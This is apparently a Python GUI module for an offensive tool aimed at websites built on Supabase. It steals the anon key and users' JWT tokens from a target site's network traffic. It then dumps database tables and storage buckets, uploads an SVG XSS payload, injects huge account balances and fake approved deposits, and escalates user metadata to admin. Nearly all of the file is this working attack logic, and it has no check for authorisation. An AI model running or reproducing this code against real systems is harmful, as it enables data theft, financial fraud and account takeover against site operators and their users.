import os
import sys
import json
import asyncio
from PySide6.QtWidgets import (
    QWidget, QVBoxLayout, QHBoxLayout, QGroupBox, QLineEdit, 
    QPushButton, QProgressBar, QSplitter, QTreeWidget, QTreeWidgetItem, 
    QHeaderView, QTextEdit, QStatusBar, QMessageBox, QLabel, QFileDialog
)
from PySide6.QtCore import Qt, QThread, Signal, Slot
from PySide6.QtGui import QColor

from gui.widgets import GlowButton

# Define the worker thread that will run the scraper/attacker async so it doesn't freeze the GUI
class SupabaseWorker(QThread):
    status_update = Signal(str)
    vuln_found = Signal(str, str) # title, details
    dump_saved = Signal(str, str) # table_name, file_path
    finished = Signal()

    def __init__(self, target_url, manual_url=None, manual_key=None):
        super().__init__()
        self.target_url = target_url
        self.manual_url = manual_url
        self.manual_key = manual_key
        self.running = False

    def run(self):
        self.running = True
        try:
            # Import our ultimate scanner here so it's fresh in the thread
            sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))
            from core.pentestgpt_supabase_ultimate import SupabaseUltimateScanner
            
            # Subclass the scanner to redirect prints to our GUI signals
            class GUISupabaseScanner(SupabaseUltimateScanner):
                def __init__(self, url, worker_ref, sup_url=None, anon_key=None):
                    super().__init__(url, sup_url, anon_key)
                    self.worker = worker_ref

                async def start_reconnaissance(self):
                    if self.supabase_url and self.anon_key:
                        self.worker.status_update.emit("\n[*] Modo Manual Ativado via Painel GUI! Ignorando scraper Playwright...")
                        self._analyze_stolen_artifacts()
                        await self.exploit_phase()
                        return
                    
                    self.worker.status_update.emit(f"\n[*] Iniciando Interceptador de Rede no Site Alvo: {self.target_site}")
                    
                    from playwright.async_api import async_playwright
                    async with async_playwright() as p:
                        browser = await p.chromium.launch(headless=True)
                        context = await browser.new_context(
                            user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                            viewport={'width': 1920, 'height': 1080}
                        )
                        page = await context.new_page()

                        # Otimização Oculta: Bloqueia recursos visuais pesados/inúteis para evitar erros de MIME no Console e espancar a performance
                        async def block_visual_resources(route):
                            if route.request.resource_type in ["image", "media", "font", "stylesheet"]:
                                await route.abort()
                            else:
                                await route.continue_()
                        await page.route("**/*", block_visual_resources)

                        page.on("request", self._intercept_network_request)
                        page.on("response", self._intercept_network_response)

                        try:
                            self.worker.status_update.emit("  [-] Abrindo Painel de Redes no Chromium e mapeando rotas...")
                            await page.goto(self.target_site, wait_until="networkidle", timeout=30000)
                            
                            self.worker.status_update.emit("  [-] Reiniciando a página (F5) para capturar o boot de chamadas API/Auth...")
                            await page.reload(wait_until="networkidle", timeout=30000)
                            
                            await page.evaluate("window.scrollTo(0, document.body.scrollHeight)")
                            await asyncio.sleep(3)
                            self.worker.status_update.emit("  [-] Buscando chaves JWT também no Next.js config e local storage...")
                            await self._extract_from_storage(page)
                        except Exception as e:
                            self.worker.status_update.emit(f"  [AVISO Scraper] Timeout ou erro de rede: {str(e)}")
                        finally:
                            await browser.close()

                    self._analyze_stolen_artifacts()

                    if self.supabase_url and self.anon_key:
                        self.worker.status_update.emit(f"\n[+] SUCESSO! Artefatos Extraídos:")
                        self.worker.status_update.emit(f"    URL: {self.supabase_url}")
                        self.worker.status_update.emit(f"    ANON_KEY: {self.anon_key[:15]}...{self.anon_key[-10:]}")
                        await self.exploit_phase()
                    else:
                        self.worker.status_update.emit("\n[-] Falha ao extrair chaves do tráfego web.")
                        self.worker.status_update.emit("[-] Por favor, insira manualmente a URL do Supabase e a ANON_KEY nos campos do Painel acima (Manual Override) e inicie o ataque novamente.")

                async def exploit_phase(self):
                    self.worker.status_update.emit("\n[*] Iniciando Fase de Exploração Ofensiva (PostgREST + GraphQL + Storage + Auth)")
                    import aiohttp
                    connector = aiohttp.TCPConnector(ssl=False, limit=50, limit_per_host=20)
                    timeout = aiohttp.ClientTimeout(total=45)
                    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
                        await self.attack_rls_bypass_tables_gui(session)
                        
                        openapi = await self.attack_openapi_schema_gui(session)
                        if openapi:
                            await self.extract_data_concurrently_gui(session, openapi, "OpenAPI")

                        schema = await self.attack_graphql_introspection_gui(session)
                        if schema:
                            await self.extract_data_concurrently_gui(session, schema.keys(), "GraphQL")
                            
                        await self.attack_storage_buckets_gui(session)
                        
                        await self.targeted_financial_exploit_gui(session)
                            
                        if self.bearer_tokens:
                            await self.attack_jwt_privilege_escalation_gui(session)
                        else:
                            self.worker.status_update.emit("\n[-] Pulo: Nenhum JWT Token Ativo foi sequestrado no Client-Side.")
                            
                async def attack_rls_bypass_tables_gui(self, session):
                    self.worker.status_update.emit("[+] Testando Bypass de Row Level Security (RLS) via REST API")
                    targets = list(self.discovered_tables) + ["profiles", "users", "admin", "settings", "app_settings"]
                    headers = self.extracted_headers.copy()
                    headers['Authorization'] = f"Bearer {self.anon_key}"
                    
                    for table in list(set(targets)):
                        url = f"{self.supabase_url}/rest/v1/{table}?select=*"
                        async with session.get(url, headers=headers) as vuln_test:
                            if vuln_test.status == 200:
                                data = await vuln_test.json()
                                if isinstance(data, list) and len(data) > 0:
                                    msg = f"RLS Bypass (REST) na tabela '{table}'. Registros: {len(data)}"
                                    self.worker.status_update.emit(f"  [🚨] {msg}")
                                    self.worker.vuln_found.emit("RLS REST Bypass", msg)
                                    self._save_dump_gui("REST_"+table, data)

                async def attack_graphql_introspection_gui(self, session):
                    self.worker.status_update.emit("\n[+] Testando Enumeração Massiva via GraphQL Introspection")
                    url = f"{self.supabase_url}/graphql/v1"
                    query = {"query": "{ __schema { types { name kind fields { name } } } }"}
                    headers = self.extracted_headers.copy()
                    headers['Authorization'] = f"Bearer {self.anon_key}"
                    
                    async with session.post(url, json=query, headers=headers) as gql_resp:
                        if gql_resp.status == 200:
                            data = await gql_resp.json()
                            if "data" in data and "__schema" in data["data"]:
                                self.worker.status_update.emit("  [🚨] CRÍTICO! pg_graphql retornou o mapa do banco!")
                                self.worker.vuln_found.emit("GraphQL Introspection", "Mapamento total de schema autorizado.")
                                
                                types = data["data"]["__schema"]["types"]
                                ignored_prefixes = ("__", "String", "Boolean", "Int", "Float", "ID", "UUID", "JSON", "Datetime", "PageInfo", "Cursor")
                                collections = {}
                                
                                for t in types:
                                    name = t.get("name", "")
                                    if t.get("kind") == "OBJECT" and not name.startswith(ignored_prefixes) and not name.endswith("Connection") and not name.endswith("Edge") and name not in ("Query", "Mutation"):
                                        if t.get("fields"):
                                            col_names = [f["name"] for f in t["fields"]]
                                            if "nodeId" in col_names or name.islower():
                                                collections[name] = col_names
                                
                                for tbl, cols in collections.items():
                                    self.worker.status_update.emit(f"      - {tbl} | {cols}")
                                    
                                if collections:
                                    self.worker.status_update.emit("\n  [-] Tentando Extracao de Dados via GraphQL (Edge Node Traversal)...")
                                    headers_gql = headers.copy()
                                    for tbl, cols in collections.items():
                                        fields_str = " ".join([c for c in cols if " " not in c and "Collection" not in c][:10])
                                        collection_name = f"{tbl}Collection"
                                        dump_query = {"query": f"query {{ {collection_name} (first: 1000) {{ edges {{ node {{ {fields_str} }} }} }} }}"}
                                        try:
                                            async with session.post(url, json=dump_query, headers=headers_gql) as exec_resp:
                                                if exec_resp.status == 200:
                                                    exec_data = await exec_resp.json()
                                                    edges = exec_data.get("data", {}).get(collection_name, {}).get("edges", [])
                                                    if edges:
                                                        msg = f"Tabela '{tbl}' (GraphQL) vazou {len(edges)} linhas!"
                                                        self.worker.status_update.emit(f"      [🚨] DUMP GQL SUCESSO! {msg}")
                                                        self.worker.vuln_found.emit("GraphQL Dump", msg)
                                                        nodes = [edge.get("node", {}) for edge in edges]
                                                        self._save_dump_gui(f"GraphQL_LEAK_{tbl}", nodes)
                                        except Exception:
                                            pass
                                return collections
                    return None

                async def attack_openapi_schema_gui(self, session):
                    self.worker.status_update.emit("\n[+] Protocolo SWAGGER: Testando Enumeração de Schema via OpenAPI")
                    url = f"{self.supabase_url}/rest/v1/?apikey={self.anon_key}"
                    headers = self.extracted_headers.copy()
                    async with session.get(url, headers=headers) as resp:
                        if resp.status == 200:
                            data = await resp.json()
                            if "definitions" in data:
                                tables = list(data["definitions"].keys())
                                msg = f"OpenAPI EXPOSTA! O PostgREST vazou o schema de {len(tables)} tabelas/views em /rest/v1/"
                                self.worker.status_update.emit(f"  [🚨] {msg}")
                                self.worker.vuln_found.emit("OpenAPI Map Leak", msg)
                                for t in tables:
                                    self.discovered_tables.add(t)
                                    self.worker.status_update.emit(f"      - {t}")
                                return tables
                        self.worker.status_update.emit(f"  [OK] OpenAPI Root (/rest/v1/) protegido. ({resp.status})")
                        return None
                        
                async def attack_storage_buckets_gui(self, session):
                    self.worker.status_update.emit("\n[+] Testando Enumeração de Storage (Buckets Públicos/Privados)")
                    url = f"{self.supabase_url}/storage/v1/bucket"
                    headers = self.extracted_headers.copy()
                    headers['Authorization'] = f"Bearer {self.anon_key}"
                    async with session.get(url, headers=headers) as resp:
                        if resp.status == 200:
                            buckets = await resp.json()
                            if isinstance(buckets, list) and len(buckets) > 0:
                                self.worker.status_update.emit(f"  [🚨] STORAGE VAZADO! Descobrido {len(buckets)} buckets de arquivos.")
                                for b in buckets:
                                    b_name = b.get('name', 'Unknown')
                                    self.worker.status_update.emit(f"      - Bucket: '{b_name}' | Público: {b.get('public', False)}")
                                    await self.test_bucket_upload_gui(session, b_name)
                            else:
                                self.worker.status_update.emit("  [OK] Nenhum bucket encontrado ou listagem bloqueada.")
                        else:
                            self.worker.status_update.emit(f"  [OK] Storage /bucket endpoint bloqueado. ({resp.status})")

                async def test_bucket_upload_gui(self, session, bucket_name):
                    url = f"{self.supabase_url}/storage/v1/object/{bucket_name}/pentestgpt_poc.svg"
                    headers = self.extracted_headers.copy()
                    headers['Authorization'] = f"Bearer {self.anon_key}"
                    headers['Content-Type'] = 'image/svg+xml'
                    xss_payload = '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(\'PentestGPT XSS Executed!\')"></svg>'
                    async with session.post(url, data=xss_payload, headers=headers) as resp:
                        if resp.status in (200, 201):
                            msg = f"ARBITRARY FILE UPLOAD PERMITIDO no bucket '{bucket_name}'!"
                            self.worker.status_update.emit(f"      [🚨] CRÍTICO! {msg}")
                            self.worker.status_update.emit(f"           RCE/XSS em: {self.supabase_url}/storage/v1/object/public/{bucket_name}/pentestgpt_poc.svg")
                            self.worker.vuln_found.emit("Storage Arbitrary Upload", f"Bucket '{bucket_name}' vulnerável a XSS/Malware hosting.")
                        else:
                            self.worker.status_update.emit(f"      [OK] Bucket '{bucket_name}' bloqueou o upload.")

                async def extract_data_concurrently_gui(self, session, tables, source_name):
                    self.worker.status_update.emit(f"\n[+] Iniciando Mass-Dump Concorrente nas Tabelas ({source_name})...")
                    headers = self.extracted_headers.copy()
                    headers['Authorization'] = f"Bearer {self.anon_key}"
                    
                    async def fetch_table(table):
                        if "Filter" in table or "Patch" in table or "Record" in table: return
                        urls = [
                            f"{self.supabase_url}/rest/v1/{table}?select=*",
                            f"{self.supabase_url}/rest/v1/{table}?id=not.is.null",
                            f"{self.supabase_url}/rest/v1/{table}?select=*,*(*)",
                            f"{self.supabase_url}/rest/v1/{table}?limit=10000",
                            f"{self.supabase_url}/rest/v1/{table}",
                            f"{self.supabase_url}/rest/v1/{table}?limit=1",
                            f"{self.supabase_url}/rest/v1/{table}?select=id",
                            f"{self.supabase_url}/rest/v1/{table}?order=id.desc.nullslast"
                        ]
                        for url in urls:
                            try:
                                async with session.get(url, headers=headers) as vuln_test:
                                    if vuln_test.status == 200:
                                        data = await vuln_test.json()
                                        if isinstance(data, list) and len(data) > 0:
                                            msg = f"DUMP SUCESSO! A tabela oculta '{table}' vazou {len(data)} linhas via {source_name}."
                                            self.worker.status_update.emit(f"  [🚨] {msg}")
                                            self.worker.vuln_found.emit(f"Ghost Table Dump ({source_name} -> REST)", msg)
                                            self._save_dump_gui(f"{source_name}_LEAK_{table}", data)
                                            return
                            except Exception:
                                pass
                                         
                    tasks = [fetch_table(t) for t in tables]
                    await asyncio.gather(*tasks, return_exceptions=True)

                async def targeted_financial_exploit_gui(self, session):
                    self.worker.status_update.emit("\n[+] Iniciando Ataque Financeiro Direcionado (Profiles, Deposits, Cards)")
                    if not self.anon_key: return
                    headers = self.extracted_headers.copy()
                    tokens_to_try = list(self.bearer_tokens) if self.bearer_tokens else [self.anon_key]
                    
                    for idx, token in enumerate(tokens_to_try):
                        headers['Authorization'] = f"Bearer {token}"
                        user_id = self._get_user_id_from_token(token) if token != self.anon_key else "unknown_user_id"
                        self.worker.status_update.emit(f"  [*] Executando Ataque Direcionado usando Token [{idx+1}/{len(tokens_to_try)}] (User ID: {user_id})")
                        
                        self.worker.status_update.emit("  [-] Tentando injetar 99.999.999 de saldo nas tabelas vinculadas (PATCH)...")
                        for tbl in ["profiles", "users", "admin"]:
                            for test_url in [f"{self.supabase_url}/rest/v1/{tbl}?user_id=eq.{user_id}", f"{self.supabase_url}/rest/v1/{tbl}?id=eq.{user_id}"]:
                                async with session.patch(test_url, json={"balance": 99999999999999, "credits": 99999999999999}, headers=headers) as resp:
                                    if resp.status in (200, 204):
                                        msg = f"Tabela '{tbl}' alterada via PATCH! Saldo infinito adicionado."
                                        self.worker.status_update.emit(f"      [🚨] CRÍTICO! {msg}")
                                        self.worker.vuln_found.emit("Balance Injection", msg)
                                        break
                                        
                        self.worker.status_update.emit("  [-] Tentando forçar aprovação de depósito fantasma (POST)...")
                        for tbl in ["deposits", "deposits_safe", "purchase_logs"]:
                            deposit_url = f"{self.supabase_url}/rest/v1/{tbl}"
                            payload = {"amount": 99999999999999, "status": "approved", "user_id": user_id, "value": 99999999999999, "state": "success"}
                            headers_post = headers.copy()
                            headers_post["Prefer"] = "return=representation"
                            async with session.post(deposit_url, json=payload, headers=headers_post) as resp:
                                if resp.status in (200, 201):
                                    msg = f"Depósito fantasma criado na tabela '{tbl}'!"
                                    self.worker.status_update.emit(f"      [🚨] CRÍTICO! {msg}")
                                    self.worker.vuln_found.emit("Ghost Deposit", msg)
                                    break

                async def attack_jwt_privilege_escalation_gui(self, session):
                    self.worker.status_update.emit("\n[+] Testando Injeção de JWT: Escalonamento de Privilégios e Injeção Massiva de Saldo")
                    token = list(self.bearer_tokens)[0]
                    headers = self.extracted_headers.copy()
                    headers['Authorization'] = f"Bearer {token}"
                    url = f"{self.supabase_url}/auth/v1/user"
                    
                    malicious_payload = {
                        "data": {
                            "role": "admin",
                            "is_admin": True,
                            "plan": "premium",
                            "balance": 99999999999999,
                            "credits": 99999999999999
                        }
                    }
                    
                    async with session.put(url, json=malicious_payload, headers=headers) as esc_resp:
                        if esc_resp.status == 200:
                            body = await esc_resp.json()
                            msg = "Account Takeover Bem Sucedido! metadata alterado para ROLE: ADMIN e SALDO ILIMITADO."
                            self.worker.status_update.emit(f"  [🚨] ALTO! {msg}")
                            self.worker.status_update.emit(f"       Metadata Pós-Ataque: {json.dumps(body.get('user_metadata', {}))}")
                            self.worker.vuln_found.emit("JWT Privilege Escalation", msg)
                        else:
                            self.worker.status_update.emit(f"  [OK] Seguro: O Supabase bloqueou a manipulação do user_metadata. ({esc_resp.status})")

                def _save_dump_gui(self, table_name, data):
                    filename = os.path.join(self.dump_dir, f"{table_name}_dump.json")
                    with open(filename, "w", encoding="utf-8") as f:
                        json.dump(data, f, indent=4, ensure_ascii=False)
                    self.worker.dump_saved.emit(table_name, filename)
                    self.worker.status_update.emit(f"      [!] DADOS SALVOS EM: {filename}")

            scanner = GUISupabaseScanner(self.target_url, self, self.manual_url, self.manual_key)
            asyncio.run(scanner.start_reconnaissance())
            
        except Exception as e:
            self.status_update.emit(f"[ERRO FATAL] {str(e)}")
        finally:
            self.running = False
            self.finished.emit()

class SupabaseWidget(QWidget):
    def __init__(self):
        super().__init__()
        self.worker = None
        self.init_ui()

    def init_ui(self):
        layout = QVBoxLayout(self)
        layout.setContentsMargins(15, 15, 15, 15)
        layout.setSpacing(10)

        # Header
        header = QLabel("SUPABASE EXPLOITATION FACILITY")
        header.setStyleSheet("font-size: 16pt; font-weight: bold; color: #ff0055; font-family: 'Consolas';")
        layout.addWidget(header)

        # Controls Group
        control_group = QGroupBox("Target & Attack Vector")
        control_group.setStyleSheet("QGroupBox { border: 1px solid #445; border-radius: 5px; margin-top: 10px; font-weight: bold; color: #fff; }")
        
        self.url_input = QLineEdit()
        self.url_input.setPlaceholderText("https://vulnerable-site-using-supabase.com")
        self.url_input.setStyleSheet("background-color: #1a1a2e; color: #00ff9d; padding: 8px; border: 1px solid #334; border-radius: 3px; font-size: 11pt;")
        
        self.manual_sup_url = QLineEdit()
        self.manual_sup_url.setPlaceholderText("Opcional: URL Supabase (Ex: https://xyz.supabase.co)")
        self.manual_sup_url.setStyleSheet("background-color: #1a1a2e; color: #ffaa00; padding: 8px; border: 1px solid #334; border-radius: 3px; font-size: 10pt;")
        
        self.manual_anon_key = QLineEdit()
        self.manual_anon_key.setPlaceholderText("Opcional: ANON_KEY Manual (eyJ...)")
        self.manual_anon_key.setStyleSheet("background-color: #1a1a2e; color: #ffaa00; padding: 8px; border: 1px solid #334; border-radius: 3px; font-size: 10pt;")
        
        self.start_btn = GlowButton("INITIATE ULTIMATE ATTACK", "#ff0055")
        self.start_btn.clicked.connect(self.start_attack)
        
        control_layout_v = QVBoxLayout()
        top_h = QHBoxLayout()
        top_h.addWidget(QLabel("Target Frontend URL:"))
        top_h.addWidget(self.url_input)
        
        bot_h = QHBoxLayout()
        bot_h.addWidget(QLabel("Manual Override:"))
        bot_h.addWidget(self.manual_sup_url)
        bot_h.addWidget(self.manual_anon_key)
        
        control_layout_v.addLayout(top_h)
        control_layout_v.addLayout(bot_h)
        control_layout_v.addWidget(self.start_btn)
        
        control_group.setLayout(control_layout_v)
        layout.addWidget(control_group)

        # Splitter (Vulns vs Logs)
        splitter = QSplitter(Qt.Horizontal)
        splitter.setStyleSheet("QSplitter::handle { background-color: #445; margin: 2px; }")

        # Left Panel (Findings & Dumps)
        left_layout = QVBoxLayout()
        left_widget = QWidget()
        left_widget.setLayout(left_layout)
        left_layout.setContentsMargins(0,0,0,0)

        self.vulns_tree = QTreeWidget()
        self.vulns_tree.setHeaderLabels(["Vulnerability / Dump", "Details"])
        self.vulns_tree.header().setSectionResizeMode(QHeaderView.ResizeToContents)
        self.vulns_tree.setStyleSheet("QTreeWidget { background-color: #0b0b14; color: #ff0055; border: 1px solid #334; }")
        left_layout.addWidget(QLabel("🔥 Discovered Vulnerabilities & DB Dumps"))
        left_layout.addWidget(self.vulns_tree)
        splitter.addWidget(left_widget)

        # Right Panel (Live Logs)
        right_layout = QVBoxLayout()
        right_widget = QWidget()
        right_widget.setLayout(right_layout)
        right_layout.setContentsMargins(0,0,0,0)

        self.logs = QTextEdit()
        self.logs.setReadOnly(True)
        self.logs.setStyleSheet("background-color: #111; color: #00f3ff; font-family: 'Consolas'; border: 1px solid #334;")
        right_layout.addWidget(QLabel("📡 Operation Logs (Headless Playwright)"))
        right_layout.addWidget(self.logs)
        
        splitter.addWidget(right_widget)
        splitter.setSizes([400, 600])
        layout.addWidget(splitter)

        # Progress
        self.progress = QProgressBar()
        self.progress.setStyleSheet("QProgressBar { border: 1px solid #445; border-radius: 5px; text-align: center; color: white; } QProgressBar::chunk { background-color: #ff0055; }")
        layout.addWidget(self.progress)
        
        self.status = QStatusBar()
        self.status.setStyleSheet("color: #ff0055; font-family: 'Consolas';")
        layout.addWidget(self.status)

    @Slot()
    def start_attack(self):
        target = self.url_input.text().strip()
        sup_url = self.manual_sup_url.text().strip()
        anon_key = self.manual_anon_key.text().strip()
        
        if not target and not sup_url:
            QMessageBox.warning(self, "Error", "Please specify the Target Frontend URL or bypass it using Manual Override.")
            return
            
        if self.worker and self.worker.running:
            return

        self.start_btn.setEnabled(False)
        self.progress.setRange(0, 0) # Indeterminate loading
        self.vulns_tree.clear()
        self.logs.clear()
        self.status.showMessage(f"Exploiting {target if target else sup_url}...")

        self.worker = SupabaseWorker(target, sup_url if sup_url else None, anon_key if anon_key else None)
        self.worker.status_update.connect(self.log_message)
        self.worker.vuln_found.connect(self.add_vuln)
        self.worker.dump_saved.emit("app_settings", "scan/app_settings_dump.json") # Just to bind the signal signature
        self.worker.dump_saved.connect(self.add_dump)
        self.worker.finished.connect(self.attack_finished)
        self.worker.start()

    @Slot(str)
    def log_message(self, msg):
        self.logs.append(msg)
        sb = self.logs.verticalScrollBar()
        sb.setValue(sb.maximum())

    @Slot(str, str)
    def add_vuln(self, title, details):
        item = QTreeWidgetItem([title, details])
        item.setForeground(0, QColor("#ff0055"))
        self.vulns_tree.addTopLevelItem(item)

    @Slot(str, str)
    def add_dump(self, table, file_path):
        item = QTreeWidgetItem([f"📦 DB Dump: {table}", f"Saved to {file_path}"])
        item.setForeground(0, QColor("#00ff9d"))
        self.vulns_tree.addTopLevelItem(item)

    @Slot()
    def attack_finished(self):
        self.start_btn.setEnabled(True)
        self.progress.setRange(0, 100)
        self.progress.setValue(100)
        self.status.showMessage("Exploitation Sequence Completed.")
